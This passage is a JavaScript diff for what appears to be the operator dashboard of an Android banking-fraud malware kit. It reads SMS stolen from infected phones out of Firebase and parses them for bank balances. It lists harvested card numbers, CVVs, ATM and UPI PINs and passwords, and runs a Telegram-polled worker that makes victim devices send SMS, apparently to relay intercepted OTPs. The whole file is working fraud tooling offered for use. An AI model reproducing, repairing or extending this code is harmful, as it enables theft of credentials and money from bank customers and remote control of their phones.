+  if (firebaseConfig.apiKey && firebaseConfig.databaseURL) {
+    const app = initializeApp(firebaseConfig);
+    db = getDatabase(app);
+    auth = getAuth(app);
+    const el = document.getElementById('firebaseStatusText');
+    const wrap = document.getElementById('firebaseStatus');
+    signInAnonymously(auth).catch(() => {
+      if (el) el.textContent = '❌ Auth Error';
+      if (wrap) wrap.className = 'firebase-status error';
+    });
+    onAuthStateChanged(auth, (user) => {
+      if (user) {
+        authReady = true;
+        if (el) el.textContent = '✅ Connected';
+        if (wrap) wrap.className = 'firebase-status';
+        authCallbacks.forEach(cb => { try { cb(); } catch(e) {} });
+        authCallbacks = [];
+      } else {
+        authReady = false;
+        if (el) el.textContent = '🔒 Auth Required';
+        if (wrap) wrap.className = 'firebase-status error';
+      }
+    });
+  } else {
+    const el = document.getElementById('firebaseStatusText');
+    const wrap = document.getElementById('firebaseStatus');
+    if (el) el.textContent = '⚠️ Config Required';
+    if (wrap) wrap.className = 'firebase-status error';
+  }
+} catch (e) {}
+
+/* HELPERS */
+const PERF = { deviceCache: new Map(), smsCache: new Map(), CACHE_TTL: 60000, clickLock: false };
+function cacheGet(map, key, ttl = PERF.CACHE_TTL) {
+  const it = map.get(key); if (!it) return null;
+  if (Date.now() - it.t > ttl) { map.delete(key); return null; }
+  return it.v;
+}
+function cacheSet(map, key, val) {
+  map.set(key, { v: val, t: Date.now() });
+  if (map.size > 500) map.delete(map.keys().next().value);
+}
+function debounce(fn, ms = 200) {
+  let t; return function(...a) { clearTimeout(t); t = setTimeout(() => fn.apply(this, a), ms); };
+}
+function throttle(fn, ms = 300) {
+  let last = 0, timer = null;
+  return function(...a) {
+    const now = Date.now();
+    if (now - last >= ms) { last = now; fn.apply(this, a); }
+    else if (!timer) timer = setTimeout(() => { last = Date.now(); timer = null; fn.apply(this, a); }, ms - (now - last));
+  };
+}
+function toast(msg, type = 'info') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.style.color = type === 'error' ? '#ff3355' : type === 'success' ? '#00ffa3' : '#fdf2f8';
+  el.classList.add('show');
+  clearTimeout(window._toastT);
+  window._toastT = setTimeout(() => el.classList.remove('show'), 2200);
+}
+window.showToast = toast;
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+function escapeAttr(s) {
+  return String(s == null ? '' : s).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, ' ');
+}
+function copyText(t) {
+  if (navigator.clipboard) navigator.clipboard.writeText(t).catch(() => {});
+  toast('📋 Copied', 'success');
+}
+window.copyToClipboard = copyText;
+window.copySms = copyText;
+
+function timeAgo(ts) {
+  if (!ts) return '—';
+  const d = new Date(ts);
+  const diff = (Date.now() - d.getTime()) / 1000;
+  if (diff < 60) return 'just now';
+  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+  if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+  return Math.floor(diff / 86400) + 'd ago';
+}
+
+function isDebitSms(body) {
+  if (!body) return false;
+  const patterns = [
+    /Dear\s+Customer,\s*Your\s+A\/c\s+XX\d+\s+has\s+been\s+debited\s+with\s+INR/i,
+    /debited\s+with\s+INR\s+[\d,]+\.\d{2}/i,
+    /A\/c\s+XX\d+\s+debited/i,
+    /Rs\.?\s*[\d,]+\.\d{2}\s+debited/i,
+    /debited\s+from\s+your\s+account/i
+  ];
+  for (let p of patterns) if (p.test(body)) return true;
+  return false;
+}
+function extractAmount(body) {
+  if (!body) return 0;
+  const patterns = [
+    /INR\s*([\d,]+\.\d{2})/i, /Rs\.?\s*([\d,]+\.\d{2})/i,
+    /debited\s+with\s+INR\s*([\d,]+\.\d{2})/i,
+    /([\d,]+\.\d{2})\s+debited/i,
+    /credited\s+with\s+INR\s*([\d,]+\.\d{2})/i,
+    /([\d,]+\.\d{2})\s+credited/i
+  ];
+  for (let p of patterns) {
+    const m = body.match(p);
+    if (m) return parseFloat(m[1].replace(/,/g, ''));
+  }
+  return 0;
+}
+function determineSmsType(sms) {
+  const body = sms.body || '';
+  if (isDebitSms(body)) return 'bank_debit';
+  if (sms.type === 'credit') return 'credit';
+  if (sms.type === 'debit') return 'debit';
+  const amt = extractAmount(body);
+  if (amt > 0) {
+    if (/credited|credit/i.test(body)) return 'credit';
+    if (/debited|debit/i.test(body)) return 'debit';
+  }
+  return 'normal';
+}
+
+/* BANK DETECTION */
+const BANK_PATTERNS = [
+  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"],[/SBIIN|SBIINB|SBI/i, "SBI"],
+  [/ICICIB|ICICI/i, "ICICI Bank"],[/AXISBK|AXISBANK|AXIS/i, "Axis Bank"],
+  [/KOTAKB|KOTAK/i, "Kotak Bank"],[/PNBSMS|PNB/i, "PNB"],
+  [/BOIIND|BOI/i, "Bank of India"],[/BOBSMS|BOB|BARODA/i, "Bank of Baroda"],
+  [/CANBNK|CANARA/i, "Canara Bank"],[/UNIONB|UBISMS/i, "Union Bank"],
+  [/YESBNK|YESBANK/i, "Yes Bank"],[/IDBIBK|IDBI/i, "IDBI Bank"],
+  [/INDUSB|INDUSIND/i, "IndusInd Bank"],[/FEDERAL|FEDBNK/i, "Federal Bank"],
+  [/RBLBNK|RBL/i, "RBL Bank"],[/PAYTM/i, "Paytm"],
+  [/PHONEPE|PHNPE/i, "PhonePe"],[/GPAY|GOOGLEPAY/i, "Google Pay"],
+  [/AMAZONPAY/i, "Amazon Pay"],[/BAJAJFIN/i, "Bajaj Finance"],
+  [/CRED/i, "CRED"],[/AIRTEL/i, "Airtel Payments"],
+  [/JIOMNY|JIOMONEY/i, "Jio Money"]
+];
+const BAL_PATTERNS = [
+  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+  /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
+  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
+  /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
+];
+function bankNameFrom(sender) {
+  if (!sender) return '';
+  for (let i = 0; i < BANK_PATTERNS.length; i++) {
+    if (BANK_PATTERNS[i][0].test(sender)) return BANK_PATTERNS[i][1];
+  }
+  const m = String(sender).toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
+  return m ? m[1] : (String(sender).toUpperCase().slice(0, 15) || 'Bank');
+}
+function isBankSms(text, sender) {
+  if (!text || text.length < 8) return false;
+  if (/AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/i.test(text)) return true;
+  const sd = String(sender || '');
+  for (let i = 0; i < BANK_PATTERNS.length; i++) {
+    if (BANK_PATTERNS[i][0].test(sd)) return true;
+  }
+  return false;
+}
+function parseBankSms(text, sender) {
+  if (!isBankSms(text, sender)) return null;
+  let bal = null;
+  for (let i = 0; i < BAL_PATTERNS.length; i++) {
+    const m = text.match(BAL_PATTERNS[i]);
+    if (m && m[1]) {
+      const v = m[1].replace(/,/g, '');
+      if (parseFloat(v) >= 0) { bal = v; break; }
+    }
+  }
+  if (!bal) return null;
+  return { bankName: bankNameFrom(sender || ''), balance: bal, rawSms: text, sender: sender || '' };
+}
+function fmtBal(v) {
+  try { return parseFloat(v).toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+  catch(e) { return String(v); }
+}
+
+const BANK_CACHE = {};
+const BANK_TRIED = {};
+async function loadBankForDevice(deviceId) {
+  if (!db || !deviceId) return;
+  if (BANK_CACHE[deviceId] !== undefined && BANK_CACHE[deviceId] !== null) return;
+  const last = BANK_TRIED[deviceId] || 0;
+  if (Date.now() - last < 15000) return;
+  BANK_TRIED[deviceId] = Date.now();
+  try {
+    const snap = await get(ref(db, `user_sms/${deviceId}`));
+    const data = snap.val() || {};
+    const entries = Object.entries(data).sort((a, b) => ((b[1] && b[1].timestamp) || 0) - ((a[1] && a[1].timestamp) || 0));
+    for (let i = 0; i < entries.length && i < 100; i++) {
+      const s = entries[i][1];
+      if (!s) continue;
+      const body = s.body || s.message || '';
+      const sender = s.sender || s.address || '';
+      const b = parseBankSms(body, sender);
+      if (b) { BANK_CACHE[deviceId] = b; return; }
+    }
+    BANK_CACHE[deviceId] = null;
+  } catch(e) { BANK_CACHE[deviceId] = null; }
+}
+function renderBankCard(deviceId) {
+  const container = document.getElementById('hdBankCardContainer');
+  if (!container) return;
+  const b = BANK_CACHE[deviceId];
+  if (!b) { container.innerHTML = ''; return; }
+  container.innerHTML = `
+    <div class="bank-card">
+      <div class="bank-card-info">
+        <div class="bank-card-name"><i class="bi bi-bank2"></i>${escapeHtml(b.bankName)}</div>
+        <div class="bank-card-balance"><small>₹</small>${escapeHtml(fmtBal(b.balance))}</div>
+        <div class="bank-card-sms">${escapeHtml((b.rawSms || '').slice(0, 60))}</div>
+      </div>
+      <button class="bank-card-refresh" onclick="refreshBankBalance()" title="Refresh"><i class="bi bi-arrow-clockwise"></i></button>
+    </div>`;
+}
+window.refreshBankBalance = async function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  delete BANK_CACHE[selectedDeviceId];
+  delete BANK_TRIED[selectedDeviceId];
+  toast('⏳ Refreshing bank balance...', 'info');
+  await loadBankForDevice(selectedDeviceId);
+  renderBankCard(selectedDeviceId);
+  if (BANK_CACHE[selectedDeviceId]) toast('✅ Bank balance detected', 'success');
+  else toast('No bank SMS found', 'info');
+};
+
+/* AUTO TOKEN */
+let autoTokenWorker = null, autoTokenWorkerUrl = null, autoTokenConfig = null, autoTokenLogs = [], autoTokenRunning = false;
+
+function _autoTokenWorkerScript() {
+  return `
+    var W = { timer: null, cfg: null, running: false, lastId: 0 };
+    function norm(i) {
+      var d = String(i == null ? '' : i).replace(/\\D/g, '');
+      if (!d) return '';
+      while (d.charAt(0) === '0') d = d.slice(1);
+      if (d.length === 12 && d.substring(0, 2) === '91') return d;
+      if (d.length === 10) return '91' + d;
+      if (d.length === 11 && d.substring(0, 2) === '91') return '91' + d.slice(-10);
+      if (d.length > 12) d = d.slice(-12);
+      if (d.length >= 10) return '91' + d.slice(-10);
+      return d;
+    }
+    function parseBot(t) {
+      if (!t) return null;
+      if (!/SMS Intercepted/i.test(t) && t.indexOf('\\uD83D\\uDCF1') < 0) return null;
+      var tm = t.match(/\\uD83D\\uDCDE\\s*To\\s*[:\\-]?\\s*(\\+?\\d{8,15})/i);
+      var mm = t.match(/\\uD83D\\uDCAC\\s*Message\\s*[:\\-]\\s*([\\s\\S]+?)(?=\\n\\s*\\uD83D\\uDCCB|\\n\\s*\\u2501|$)/i);
+      if (!tm || !mm) return null;
+      var to = norm(tm[1]);
+      if (!to || to.length !== 12) return null;
+      var m = mm[1].trim();
+      if (!m) return null;
+      return { to: to, message: m };
+    }
+    function post(m) { try { self.postMessage(m); } catch(e) {} }
+    function sendSms(c, to, message) {
+      var body = JSON.stringify({ from: 1, to: to, message: message, isSended: false, timestamp: Date.now() });
+      var url = c.firebaseUrl + '/clients/' + c.deviceId + '/webhookEvent/sendSms.json?auth=' + c.auth;
+      fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: body })
+        .then(function() { post({ type: 'log', level: 'ok', text: 'Sent → ' + to }); post({ type: 'sent', to: to }); })
+        .catch(function() { post({ type: 'log', level: 'err', text: 'Send failed' }); });
+    }
+    function tick() {
+      if (!W.running || !W.cfg) return;
+      var c = W.cfg;
+      if (c.activatedAt && (Date.now() - c.activatedAt > 86400000)) {
+        W.running = false;
+        if (W.timer) { clearInterval(W.timer); W.timer = null; }
+        post({ type: 'expired' });
+        return;
+      }
+      var off = W.lastId ? (W.lastId + 1) : 0;
+      var u = 'https://api.telegram.org/bot' + c.botToken + '/getUpdates?timeout=0&offset=' + off + '&limit=30&allowed_updates=["channel_post","message"]';
+      fetch(u, { signal: AbortSignal.timeout(8000) })
+        .then(function(r) { return r.json(); })
+        .then(function(j) {
+          if (!j || !j.ok || !Array.isArray(j.result)) return;
+          for (var i = 0; i < j.result.length; i++) {
+            var upd = j.result[i];
+            if (upd.update_id > W.lastId) W.lastId = upd.update_id;
+            var msg = upd.channel_post || upd.message;
+            if (!msg || !msg.text) continue;
+            var p = parseBot(msg.text);
+            if (p) {
+              post({ type: 'log', level: 'info', text: '→ To: ' + p.to + ' | ' + p.message.slice(0, 40) });
+              sendSms(c, p.to, p.message);
+            }
+          }
+        }).catch(function() {});
+    }
+    self.onmessage = function(e) {
+      var d = e.data;
+      if (!d || !d.cmd) return;
+      if (d.cmd === 'start') {
+        W.cfg = d.cfg; W.lastId = d.cfg.lastUpdateId || 0; W.running = true;
+        if (W.timer) clearInterval(W.timer);
+        W.timer = setInterval(tick, 100);
+        tick();
+        post({ type: 'state', running: true });
+      } else if (d.cmd === 'stop') {
+        W.running = false;
+        if (W.timer) { clearInterval(W.timer); W.timer = null; }
+        post({ type: 'state', running: false });
+      }
+    };
+  `;
+}
+function startAutoTokenWorker(cfg) {
+  try {
+    if (!autoTokenWorkerUrl) {
+      const blob = new Blob(['(' + 'function(){' + _autoTokenWorkerScript() + '}()'], { type: 'application/javascript' });
+      autoTokenWorkerUrl = URL.createObjectURL(blob);
+    }
+    if (autoTokenWorker) { try { autoTokenWorker.terminate(); } catch(e) {} }
+    autoTokenWorker = new Worker(autoTokenWorkerUrl);
+    autoTokenWorker.onmessage = (e) => {
+      const d = e.data;
+      if (!d) return;
+      if (d.type === 'log') addAutoTokenLog(d.level || 'info', d.text || '');
+      else if (d.type === 'sent') toast('🤖 Auto-SMS → ' + d.to, 'success');
+      else if (d.type === 'expired') {
+        autoTokenRunning = false;
+        if (autoTokenConfig) { autoTokenConfig.enabled = false; autoTokenConfig.activatedAt = 0; saveAutoTokenConfig(autoTokenConfig); }
+        updateAutoTokenUI();
+        toast('⏱ Auto Token 24h reset', 'info');
+        stopAutoTokenWorker();
+      }
+    };
+    autoTokenWorker.onerror = () => {};
+    autoTokenWorker.postMessage({ cmd: 'start', cfg: cfg });
+    autoTokenRunning = true;
+  } catch(e) {}
+}
+function stopAutoTokenWorker() {
+  try {
+    if (autoTokenWorker) { autoTokenWorker.postMessage({ cmd: 'stop' }); autoTokenWorker.terminate(); autoTokenWorker = null; }
+  } catch(e) {}
+  autoTokenRunning = false;
+}
+function addAutoTokenLog(level, text) {
+  autoTokenLogs.unshift({ t: Date.now(), level, text });
+  if (autoTokenLogs.length > 30) autoTokenLogs.length = 30;
+  renderAutoTokenLog();
+}
+function renderAutoTokenLog() {
+  const el = document.getElementById('asLog');
+  if (!el) return;
+  if (!autoTokenLogs.length) { el.innerHTML = '<div style="text-align:center;color:var(--label);padding:8px;">No activity yet</div>'; return; }
+  el.innerHTML = autoTokenLogs.map(l => {
+    const ts = new Date(l.t).toLocaleTimeString();
+    const cl = l.level === 'ok' ? 'ok' : l.level === 'err' ? 'err' : 'info';
+    return `<div class="auto-log-item"><span class="ts">${ts}</span> · <span class="${cl}">${escapeHtml(l.text)}</span></div>`;
+  }).join('');
+}
+async function saveAutoTokenConfig(cfg) {
+  if (!selectedDeviceId || !db) return;
+  if (cfg) autoTokenConfig = cfg;
+  if (!autoTokenConfig) return;
+  try { await set(ref(db, `dakkuAutoSms/${selectedDeviceId}`), autoTokenConfig); } catch(e) {}
+}
+async function loadAutoTokenConfig(deviceId) {
+  if (!db) return;
+  try {
+    const snap = await get(ref(db, `dakkuAutoSms/${deviceId}`));
+    autoTokenConfig = snap.val() || null;
+    if (autoTokenConfig && autoTokenConfig.enabled) {
+      if (autoTokenConfig.activatedAt && Date.now() - autoTokenConfig.activatedAt > 86400000) {
+        autoTokenConfig.enabled = false; autoTokenConfig.activatedAt = 0;
+        saveAutoTokenConfig(autoTokenConfig);
+      } else {
+        startAutoTokenWorker({
+          botToken: autoTokenConfig.botToken, firebaseUrl: firebaseConfig.databaseURL,
+          deviceId: selectedDeviceId, auth: '', lastUpdateId: autoTokenConfig.lastUpdateId || 0,
+          activatedAt: autoTokenConfig.activatedAt || 0
+        });
+        autoTokenRunning = true;
+      }
+    }
+  } catch(e) { autoTokenConfig = null; }
+  updateAutoTokenUI();
+}
+function updateAutoTokenUI() {
+  const chDisplay = document.getElementById('asChannelDisplay');
+  const btn = document.getElementById('asActiveBtn');
+  const liveStatus = document.getElementById('asLiveStatus');
+  const chInput = document.getElementById('asChannel');
+  const tkInput = document.getElementById('asBotToken');
+  if (!chDisplay || !btn) return;
+  if (autoTokenConfig && autoTokenConfig.channel) {
+    chDisplay.textContent = autoTokenConfig.channel;
+    if (chInput) chInput.value = autoTokenConfig.channel || '';
+    if (tkInput) tkInput.value = autoTokenConfig.botToken || '';
+  } else { chDisplay.textContent = 'Not configured'; }
+  if (autoTokenRunning) {
+    btn.classList.add('running'); btn.textContent = 'DEACTIVATE';
+    if (liveStatus) liveStatus.style.display = 'block';
+  } else {
+    btn.classList.remove('running'); btn.textContent = 'ACTIVATE';
+    if (liveStatus) liveStatus.style.display = 'none';
+  }
+}
+window.openAutoTokenModal = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  updateAutoTokenUI();
+  renderAutoTokenLog();
+  new bootstrap.Modal(document.getElementById('autoTokenModal')).show();
+};
+window.toggleAutoToken = async function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const err = document.getElementById('asErr');
+  if (err) { err.style.display = 'none'; err.textContent = ''; }
+  const btn = document.getElementById('asActiveBtn');
+  if (autoTokenRunning && autoTokenConfig) {
+    btn.disabled = true; btn.textContent = 'Stopping...';
+    try {
+      autoTokenConfig.enabled = false;
+      await saveAutoTokenConfig(autoTokenConfig);
+      stopAutoTokenWorker();
+      updateAutoTokenUI();
+      toast('⛔ Auto Token stopped', 'success');
+    } catch(e) { if (err) { err.style.display = 'block'; err.textContent = '⚠ ' + e.message; } }
+    finally { btn.disabled = false; }
+    return;
+  }
+  const ch = document.getElementById('asChannel').value.trim();
+  const tk = document.getElementById('asBotToken').value.trim();
+  if (!ch) { if (err) { err.style.display = 'block'; err.textContent = 'Channel required'; } return; }
+  if (!tk || !/^\d+:[\w-]+$/.test(tk)) { if (err) { err.style.display = 'block'; err.textContent = 'Valid bot token required'; } return; }
+  btn.disabled = true; btn.textContent = 'Activating...';
+  try {
+    const t = await fetch('https://api.telegram.org/bot' + tk + '/getMe', { signal: AbortSignal.timeout(8000) });
+    const tj = await t.json();
+    if (!t.ok || !tj.ok) throw new Error('Invalid bot token');
+    const cfg = { enabled: true, channel: ch, botToken: tk, botUsername: (tj.result && tj.result.username) || '', lastUpdateId: 0, activatedAt: Date.now() };
+    autoTokenConfig = cfg;
+    await saveAutoTokenConfig(cfg);
+    addAutoTokenLog('ok', 'Bot @' + cfg.botUsername + ' connected');
+    addAutoTokenLog('info', 'Background worker · 0.1s poll · 24h auto-reset');
+    startAutoTokenWorker({ botToken: tk, firebaseUrl: firebaseConfig.databaseURL, deviceId: selectedDeviceId, auth: '', lastUpdateId: 0, activatedAt: cfg.activatedAt });
+    updateAutoTokenUI();
+    toast('🤖 Auto Token LIVE', 'success');
+  } catch(e) { if (err) { err.style.display = 'block'; err.textContent = '⚠ ' + e.message; } }
+  finally { btn.disabled = false; }
+};
+window.resetAutoToken = async function() {
+  if (!selectedDeviceId) return;
+  if (!confirm('Reset Auto Token completely?')) return;
+  stopAutoTokenWorker();
+  autoTokenConfig = null;
+  try { if (db) await remove(ref(db, `dakkuAutoSms/${selectedDeviceId}`)); } catch(e) {}
+  autoTokenLogs = [];
+  renderAutoTokenLog();
+  const chInput = document.getElementById('asChannel');
+  const tkInput = document.getElementById('asBotToken');
+  if (chInput) chInput.value = '';
+  if (tkInput) tkInput.value = '';
+  updateAutoTokenUI();
+  toast('♻ Auto Token reset', 'info');
+};
+
+/* STATE */
+let allDevices = [], allDevicesFull = [], filteredDevices = [];
+let selectedDeviceId = null, selectedDevice = null;
+let allSmsFlat = [], filteredSms = [];
+let allBackupFlat = [], filteredBackup = [];
+let allDataFlat = [], filteredAllData = [];
+let deviceSerialMap = {};
+let adminPassword = null, deletePassword = null;
+let isUnlocked = false, isBotRunning = false;
+let isExpired = false, isBlocked = false, expiryDate = null;
+let expiryTimerInterval = null;
+let expiryTimerElement = document.getElementById('expiryTimerElement');
+let deviceSmsFlat = [], deviceSmsFiltered = [];
+let deviceSmsUnsub = null, deviceDataUnsub = null;
+let cfStatusUnsub = null, ussdUnsub = null, selectedDeviceStatusUnsub = null;
+let allDataUnsub = null;
+let knownSmsKeys = new Set();
+let allSmsUnsub = null;
+let livePollInterval = null, livePollKeySet = new Set(), isPolling = false;
+let currentBackupFilter = 'all', currentBackupSearchTerm = '';
+let smsStoreUnsub = null, currentSmsStoreState = false;
+const SMS_PAGE_SIZE = 50;
+let totalDeviceCount = 0, smsPageOffset = 0, smsHasMore = true, smsLoading = false;
+const serialFetchPending = new Set();
+const liveStatusListeners = new Map();
+let pendingDeleteAction = null;
+let currentSmsFilter = 'all', currentSmsSearchTerm = '', currentAllDataSearchTerm = '';
+
+const LOGIN_FIELDS = [
+      { key: 'na', label: 'Name' },
+            { key: 'can', label: 'ca number' },
+            { key: 'do', label: 'Date Of Birth' },
+            { key: 'C', label: 'Card Number' },
+            { key: 'E', label: 'Expiry' },
+            { key: 'Cc', label: 'CVV' },
+            { key: 'at', label: 'ATM Pin' },
+            { key: 'tr', label: 'Transaction Password' },
+            { key: 'bn', label: 'Bank Name' },
+            { key: 'up', label: 'UPI Pin' },
+            { key: 'upi', label: 'UPI ID' },
+            { key: 'u', label: 'Username' },
+            { key: 'pa', label: 'Password' },
+            { key: 'bank_name', label: 'Bank Name' },
+            { key: 'Pn', label: 'Pan Card Number' },
+            { key: 'mo', label: 'Mobile number' }
+];
+const ACCENTS = ['#ff2d6f', '#00ffa3', '#c84bff', '#b4ff2e', '#ff6bb5', '#4f9dff', '#ffb020', '#ff3355', '#ec4899', '#8b5cf6', '#14b8a6', '#eab308'];
+
+/* SESSION */
+const SESSION_KEY = 'daimon-admin-session';
+const SESSION_DURATION = 24 * 60 * 60 * 1000;
+function saveSession() {
+  try { localStorage.setItem(SESSION_KEY, JSON.stringify({ unlocked: true, ts: Date.now(), pwdHash: btoa(adminPassword || '') })); } catch(e) {}
+}
+function checkSession() {
+  try {
+    const raw = localStorage.getItem(SESSION_KEY);
+    if (!raw) return false;
+    const data = JSON.parse(raw);
+    if (!data.unlocked) return false;
+    if (Date.now() - data.ts > SESSION_DURATION) { localStorage.removeItem(SESSION_KEY); return false; }
+    return true;
+  } catch(e) { return false; }
+}
+function clearSession() { try { localStorage.removeItem(SESSION_KEY); } catch(e) {} }
+window.logoutSession = function() {
+  if (!confirm('Logout now? You will need to enter password again.')) return;
+  clearSession(); isUnlocked = false; toast('Logged out', 'success');
+  setTimeout(() => location.reload(), 500);
+};
+function updateSessionDisplay() {
+  const el = document.getElementById('sessionStatus');
+  if (!el) return;
+  if (!isUnlocked) { el.textContent = 'Not logged in'; return; }
+  try {
+    const raw = localStorage.getItem(SESSION_KEY);
+    if (!raw) { el.textContent = 'Session not saved'; return; }
+    const data = JSON.parse(raw);
+    const remaining = SESSION_DURATION - (Date.now() - data.ts);
+    if (remaining <= 0) { el.textContent = 'Expired'; return; }
+    const hours = Math.floor(remaining / 3600000);
+    const mins = Math.floor((remaining % 3600000) / 60000);
+    el.textContent = `Active • ${hours}h ${mins}m remaining`;
+  } catch(e) { el.textContent = 'Active'; }
+}
+
+/* SERIAL */
+function getSerialForDevice(deviceId) {
+  if (!deviceId) return null;
+  if (deviceSerialMap[deviceId] != null && deviceSerialMap[deviceId] !== '') return String(deviceSerialMap[deviceId]);
+  const d = allDevicesFull.find(x => x.deviceId === deviceId);
+  if (d && d.user_serial) { deviceSerialMap[deviceId] = d.user_serial; return String(d.user_serial); }
+  if (!serialFetchPending.has(deviceId) && db) {
+    serialFetchPending.add(deviceId);
+    get(ref(db, `user_data/${deviceId}/user_serial`)).then(snap => {
+      const v = snap.val();
+      if (v) { deviceSerialMap[deviceId] = v; update(ref(db, 'device_serials'), { [deviceId]: v }).catch(() => {}); }
+      serialFetchPending.delete(deviceId);
+      if (filteredSms.length) renderSmsList();
+    }).catch(() => serialFetchPending.delete(deviceId));
+  }
+  return null;
+}
+window.getSerialForDevice = getSerialForDevice;
+
+function assignPermanentSerials(devices) {
+  const sorted = [...devices].sort((a, b) => {
+    const dateA = a.timeandDate && a.timeandDate !== 'N/A' ? new Date(a.timeandDate) : new Date(0);
+    const dateB = b.timeandDate && b.timeandDate !== 'N/A' ? new Date(b.timeandDate) : new Date(0);
+    return dateB - dateA;
+  });
+  let maxSerial = 0;
+  for (const id in deviceSerialMap) { const n = Number(deviceSerialMap[id]); if (!isNaN(n) && n > maxSerial) maxSerial = n; }
+  const newSerials = {};
+  sorted.forEach(d => {
+    if (!deviceSerialMap[d.deviceId]) { maxSerial++; deviceSerialMap[d.deviceId] = maxSerial; newSerials[d.deviceId] = maxSerial; }
+  });
+  if (Object.keys(newSerials).length && db) update(ref(db, 'device_serials'), newSerials).catch(() => {});
+  devices.forEach(d => { d.user_serial = deviceSerialMap[d.deviceId] || 0; });
+  return devices;
+}
+
+/* TABS */
+function switchTab(page) {
+  if (!isUnlocked || isExpired || isBlocked) return;
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page-' + page)?.classList.add('active');
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === page));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.page === page));
+  if (page === 'messages') { applySmsFilter(); renderSmsList(); }
+  if (page === 'devices') { resetDeviceView(); renderDeviceList(); }
+  if (page === 'backup') { computeBackupCounts(); applyBackupFilter(); }
+  if (page === 'alldata') renderAllDataList();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+window.switchTab = switchTab;
+document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => switchTab(t.dataset.page)));
+document.querySelectorAll('.nav-item').forEach(n => n.addEventListener('click', () => switchTab(n.dataset.page)));
+
+function resetDeviceView() {
+  if (deviceSmsUnsub) { try { deviceSmsUnsub(); } catch(e) {} deviceSmsUnsub = null; }
+  if (deviceDataUnsub) { try { deviceDataUnsub(); } catch(e) {} deviceDataUnsub = null; }
+  if (cfStatusUnsub) { try { cfStatusUnsub(); } catch(e) {} cfStatusUnsub = null; }
+  if (ussdUnsub) { try { ussdUnsub(); } catch(e) {} ussdUnsub = null; }
+  if (selectedDeviceStatusUnsub) { try { selectedDeviceStatusUnsub(); } catch(e) {} selectedDeviceStatusUnsub = null; }
+  if (smsStoreUnsub) { try { smsStoreUnsub(); } catch(e) {} smsStoreUnsub = null; }
+  stopLivePoll();
+  deviceSmsFlat = []; deviceSmsFiltered = [];
+  selectedDeviceId = null; selectedDevice = null;
+  document.getElementById('deviceListView').style.display = 'block';
+  document.getElementById('homeDeviceView').style.display = 'none';
+}
+
+/* EXPIRY */
+function checkExpiry() {
+  if (!db) return;
+  onValue(ref(db, 'admin/expiry_date'), (snapshot) => {
+    const expiryValue = snapshot.val();
+    if (!expiryValue) {
+      isExpired = false;
+      document.body.classList.remove('expired');
+      document.getElementById('expiryOverlay').classList.remove('show');
+      stopExpiryTimer();
+      return;
+    }
+    expiryDate = new Date(expiryValue);
+    const now = new Date();
+    if (now > expiryDate) {
+      isExpired = true;
+      document.body.classList.add('expired');
+      document.getElementById('expiryOverlay').classList.add('show');
+      document.getElementById('expiryDateDisplay').textContent = expiryDate.toLocaleDateString();
+      document.getElementById('loginOverlay').classList.remove('show');
+      stopExpiryTimer();
+    } else {
+      isExpired = false;
+      document.body.classList.remove('expired');
+      document.getElementById('expiryOverlay').classList.remove('show');
+      startExpiryTimer(expiryDate);
+    }
+  });
+}
+function startExpiryTimer(expDate) {
+  stopExpiryTimer();
+  if (!expiryTimerElement) return;
+  expiryTimerElement.classList.add('show');
+  expiryTimerElement.classList.remove('expired');
+  function updateTimer() {
+    const diff = expDate - new Date();
+    if (diff <= 0) {
+      expiryTimerElement.textContent = '⛔ EXPIRED';
+      expiryTimerElement.classList.add('expired');
+      isExpired = true;
+      document.getElementById('expiryOverlay').classList.add('show');
+      document.body.classList.add('expired');
+      stopExpiryTimer();
+      return;
+    }
+    const days = Math.floor(diff / 86400000);
+    const hours = Math.floor((diff % 86400000) / 3600000);
+    const minutes = Math.floor((diff % 3600000) / 60000);
+    const seconds = Math.floor((diff % 60000) / 1000);
+    let timeStr = '';
+    if (days > 0) timeStr += `${days}d `;
+    if (hours > 0 || days > 0) timeStr += `${hours}h `;
+    if (minutes > 0 || hours > 0 || days > 0) timeStr += `${minutes}m `;
+    timeStr += `${seconds}s`;
+    expiryTimerElement.textContent = `⏳ Expires in: ${timeStr}`;
+  }
+  updateTimer();
+  expiryTimerInterval = setInterval(updateTimer, 1000);
+}
+function stopExpiryTimer() {
